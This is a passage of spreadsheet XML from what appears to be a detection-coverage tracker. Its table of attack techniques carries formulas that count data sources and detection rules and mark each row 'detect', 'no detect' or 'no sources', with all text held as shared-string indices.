        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S37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76" t="s">
        <v>503</v>
      </c>
      <c r="U376" t="s">
        <v>1873</v>
      </c>
      <c r="V376" t="s">
        <v>1874</v>
      </c>
      <c r="W376" t="b">
        <v>1</v>
      </c>
      <c r="X376" t="s">
        <v>1844</v>
      </c>
    </row>
    <row r="377" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A377" t="s">
        <v>1844</v>
      </c>
      <c r="B377" t="s">
        <v>1875</v>
      </c>
      <c r="C377" t="s">
        <v>1876</v>
      </c>
      <c r="D377" t="s">
        <v>646</v>
      </c>
      <c r="E377" t="s">
        <v>634</v>
      </c>
      <c r="F377" s="9">
        <f t="shared" si="5"/>
        <v>2</v>
      </c>
      <c r="G377" s="9" cm="1">
        <f t="array" ref="G377">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H377" s="9" t="str" cm="1">
        <f t="array" ref="H377">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I377" s="9" t="str" cm="1">
        <f t="array" ref="I377">IF(SUM(IF($C377=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C377=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J377" s="9" t="str" cm="1">
        <f t="array" ref="J37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77" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M377" s="9" cm="1">
        <f t="array" ref="M377">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N377" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O377" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P377" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S37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77" t="s">
        <v>658</v>
      </c>
      <c r="U377" t="s">
        <v>1877</v>
      </c>
      <c r="V377" t="s">
        <v>1878</v>
      </c>
      <c r="W377" t="b">
        <v>1</v>
      </c>
      <c r="X377" t="s">
        <v>1844</v>
      </c>
    </row>
    <row r="378" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A378" t="s">
        <v>1844</v>
      </c>
      <c r="B378" t="s">
        <v>1879</v>
      </c>
      <c r="C378" t="s">
        <v>1880</v>
      </c>
      <c r="D378" t="s">
        <v>646</v>
      </c>
      <c r="E378" t="s">
        <v>1881</v>
      </c>
      <c r="F378" s="9">
        <f t="shared" si="5"/>
        <v>4</v>
      </c>
      <c r="G378" s="9" cm="1">
        <f t="array" ref="G378">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H378" s="9" t="str" cm="1">
        <f t="array" ref="H378">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I378" s="9" t="str" cm="1">
        <f t="array" ref="I378">IF(SUM(IF($C378=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C378=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J378" s="9" t="str" cm="1">
        <f t="array" ref="J37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78" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M378" s="9" cm="1">
        <f t="array" ref="M378">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N378" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O378" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P378" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S37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78" t="s">
        <v>386</v>
      </c>
      <c r="U378" t="s">
        <v>1882</v>
      </c>
      <c r="V378" t="s">
        <v>1883</v>
      </c>
      <c r="W378" t="b">
        <v>1</v>
      </c>
      <c r="X378" t="s">
        <v>1844</v>
      </c>
    </row>
    <row r="379" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A379" t="s">
        <v>1844</v>
      </c>
      <c r="B379" t="s">
        <v>1884</v>
      </c>
      <c r="C379" t="s">
        <v>1885</v>
      </c>
      <c r="D379" t="s">
        <v>646</v>
      </c>
      <c r="E379" t="s">
        <v>1886</v>
      </c>
      <c r="F379" s="9">
        <f t="shared" si="5"/>
        <v>3</v>
      </c>
      <c r="G379" s="9" cm="1">
        <f t="array" ref="G379">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H379" s="9" t="str" cm="1">
        <f t="array" ref="H379">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I379" s="9" t="str" cm="1">
        <f t="array" ref="I379">IF(SUM(IF($C379=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C379=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J379" s="9" t="str" cm="1">
        <f t="array" ref="J37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79" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M379" s="9" cm="1">
        <f t="array" ref="M379">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N379" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O379" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P379" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S37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79" t="s">
        <v>386</v>
      </c>
      <c r="U379" t="s">
        <v>1887</v>
      </c>
      <c r="V379" t="s">
        <v>1888</v>
      </c>
      <c r="W379" t="b">
        <v>1</v>
      </c>
      <c r="X379" t="s">
        <v>1844</v>
      </c>
    </row>
    <row r="380" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A380" t="s">
        <v>1844</v>
      </c>
      <c r="B380" t="s">
        <v>1889</v>
      </c>
      <c r="C380" t="s">
        <v>1890</v>
      </c>
      <c r="D380" t="s">
        <v>646</v>
      </c>
      <c r="E380" t="s">
        <v>1891</v>
      </c>
      <c r="F380" s="9">
        <f t="shared" si="5"/>
        <v>4</v>
      </c>
      <c r="G380" s="9" cm="1">
        <f t="array" ref="G380">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H380" s="9" t="str" cm="1">
        <f t="array" ref="H380">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I380" s="9" t="str" cm="1">
        <f t="array" ref="I380">IF(SUM(IF($C380=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C380=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J380" s="9" t="str" cm="1">
        <f t="array" ref="J38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80" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M380" s="9" cm="1">
        <f t="array" ref="M380">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N380" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O380" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P380" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S38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80" t="s">
        <v>386</v>
      </c>
      <c r="U380" t="s">
        <v>1892</v>
      </c>
      <c r="V380" t="s">
        <v>1893</v>
      </c>
      <c r="W380" t="b">
        <v>1</v>
      </c>
      <c r="X380" t="s">
        <v>1844</v>
      </c>
    </row>
    <row r="381" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A381" t="s">
        <v>1844</v>
      </c>
      <c r="B381" t="s">
        <v>1894</v>
      </c>
      <c r="C381" t="s">
        <v>329</v>
      </c>
      <c r="D381" t="s">
        <v>646</v>
      </c>
      <c r="E381" t="s">
        <v>1895</v>
      </c>
      <c r="F381" s="9">
        <f t="shared" si="5"/>
        <v>5</v>
      </c>
      <c r="G381" s="9" cm="1">
        <f t="array" ref="G381">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H381" s="9" t="str" cm="1">
        <f t="array" ref="H381">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I381" s="9" t="str" cm="1">
        <f t="array" ref="I381">IF(SUM(IF($C381=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C381=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J381" s="9" t="str" cm="1">
        <f t="array" ref="J38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81" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M381" s="9" cm="1">
        <f t="array" ref="M381">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N381" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O381" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P381" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S38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81" t="s">
        <v>386</v>
      </c>
      <c r="U381" t="s">
        <v>1896</v>
      </c>
      <c r="V381" t="s">
        <v>1897</v>
      </c>
      <c r="W381" t="b">
        <v>1</v>
      </c>
      <c r="X381" t="s">
        <v>1844</v>
      </c>
    </row>
    <row r="382" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A382" t="s">
        <v>1844</v>
      </c>
      <c r="B382" t="s">
        <v>1898</v>
      </c>
      <c r="C382" t="s">
        <v>1899</v>
      </c>
      <c r="D382" t="s">
        <v>646</v>
      </c>
      <c r="E382" t="s">
        <v>657</v>
      </c>
      <c r="F382" s="9">
        <f t="shared" si="5"/>
        <v>4</v>
      </c>
      <c r="G382" s="9" cm="1">
        <f t="array" ref="G382">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H382" s="9" t="str" cm="1">
        <f t="array" ref="H382">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I382" s="9" t="str" cm="1">
        <f t="array" ref="I382">IF(SUM(IF($C382=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C382=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J382" s="9" t="str" cm="1">
        <f t="array" ref="J38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82" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M382" s="9" cm="1">
        <f t="array" ref="M382">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N382" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O382" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P382" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S38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82" t="s">
        <v>416</v>
      </c>
      <c r="U382" t="s">
        <v>1900</v>
      </c>
      <c r="V382" t="s">
        <v>1901</v>
      </c>
      <c r="W382" t="b">
        <v>1</v>
      </c>
      <c r="X382" t="s">
        <v>1844</v>
      </c>
    </row>
    <row r="383" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A383" t="s">
        <v>1844</v>
      </c>
      <c r="B383" t="s">
        <v>1902</v>
      </c>
      <c r="C383" t="s">
        <v>1903</v>
      </c>
      <c r="D383" t="s">
        <v>646</v>
      </c>
      <c r="E383" t="s">
        <v>1904</v>
      </c>
      <c r="F383" s="9">
        <f t="shared" si="5"/>
        <v>4</v>
      </c>
      <c r="G383" s="9" cm="1">
        <f t="array" ref="G383">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H383" s="9" t="str" cm="1">
        <f t="array" ref="H383">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I383" s="9" t="str" cm="1">
        <f t="array" ref="I383">IF(SUM(IF($C383=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C383=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J383" s="9" t="str" cm="1">
        <f t="array" ref="J38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83" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M383" s="9" cm="1">
        <f t="array" ref="M383">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N383" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O383" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P383" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S38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83" t="s">
        <v>386</v>
      </c>
      <c r="U383" t="s">
        <v>1905</v>
      </c>
      <c r="V383" t="s">
        <v>1906</v>
      </c>
      <c r="W383" t="b">
        <v>1</v>
      </c>
      <c r="X383" t="s">
        <v>1844</v>
      </c>
    </row>
    <row r="384" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A384" t="s">
        <v>1844</v>
      </c>
      <c r="B384" t="s">
        <v>1907</v>
      </c>
      <c r="C384" t="s">
        <v>1908</v>
      </c>
      <c r="D384" t="s">
        <v>646</v>
      </c>
      <c r="E384" t="s">
        <v>1886</v>
      </c>
      <c r="F384" s="9">
        <f t="shared" si="5"/>
        <v>3</v>
      </c>
      <c r="G384" s="9" cm="1">
        <f t="array" ref="G384">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H384" s="9" t="str" cm="1">
        <f t="array" ref="H384">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I384" s="9" t="str" cm="1">
        <f t="array" ref="I384">IF(SUM(IF($C384=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C384=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J384" s="9" t="str" cm="1">
        <f t="array" ref="J38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84" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M384" s="9" cm="1">
        <f t="array" ref="M384">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N384" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O384" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P384" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S38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84" t="s">
        <v>658</v>
      </c>
      <c r="U384" t="s">
        <v>1909</v>
      </c>
      <c r="V384" t="s">
        <v>1910</v>
      </c>
      <c r="W384" t="b">
        <v>1</v>
      </c>
      <c r="X384" t="s">
        <v>1844</v>
      </c>
    </row>
    <row r="385" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A385" t="s">
        <v>1911</v>
      </c>
      <c r="B385" t="s">
        <v>1911</v>
      </c>
      <c r="C385" t="s">
        <v>19</v>
      </c>
      <c r="D385" t="s">
        <v>747</v>
      </c>
      <c r="E385" t="s">
        <v>1912</v>
      </c>
      <c r="F385" s="9">
        <f t="shared" si="5"/>
        <v>8</v>
      </c>
      <c r="G385" s="9" cm="1">
        <f t="array" ref="G385">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H385" s="9" cm="1">
        <f t="array" ref="H385">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>6</v>
      </c>
      <c r="I385" s="9" t="str" cm="1">
        <f t="array" ref="I385">IF(SUM(IF($C385=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C385=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J385" s="9" cm="1">
        <f t="array" ref="J38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385" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>6</v>
      </c>
      <c r="M385" s="9" cm="1">
        <f t="array" ref="M385">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>6</v>
      </c>
      <c r="N385" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O385" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P385" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S38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85" t="s">
        <v>1913</v>
      </c>
      <c r="U385" t="s">
        <v>1914</v>
      </c>
      <c r="V385" t="s">
        <v>1915</v>
      </c>
      <c r="W385" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="386" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A386" t="s">
        <v>1911</v>
      </c>
      <c r="B386" t="s">
        <v>1916</v>
      </c>
      <c r="C386" t="s">
        <v>1917</v>
      </c>
      <c r="D386" t="s">
        <v>747</v>
      </c>
      <c r="E386" t="s">
        <v>1918</v>
      </c>
      <c r="F386" s="9">
        <f t="shared" ref="F386:F449" si="6">LEN(E386)-LEN(SUBSTITUTE(E386,",",""))+1</f>
        <v>3</v>
      </c>
      <c r="G386" s="9" cm="1">
